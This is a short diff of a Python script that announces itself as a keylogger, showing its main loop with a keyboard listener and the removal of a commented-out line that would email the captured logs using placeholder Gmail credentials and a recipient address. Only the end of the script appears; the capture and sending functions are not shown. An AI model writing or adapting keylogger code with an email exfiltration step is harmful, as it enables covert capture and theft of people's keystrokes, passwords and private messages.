@@ -29,6 +29,3 @@ if __name__ == "__main__":
     print("Keylogger started. Press ESC to stop.")
     with Listener(on_press=on_press) as listener:
         listener.join()
-    
-    # Optional: Uncomment to send logs via email
-    # send_logs("your_email@gmail.com", "your_password", "recipient@example.com")
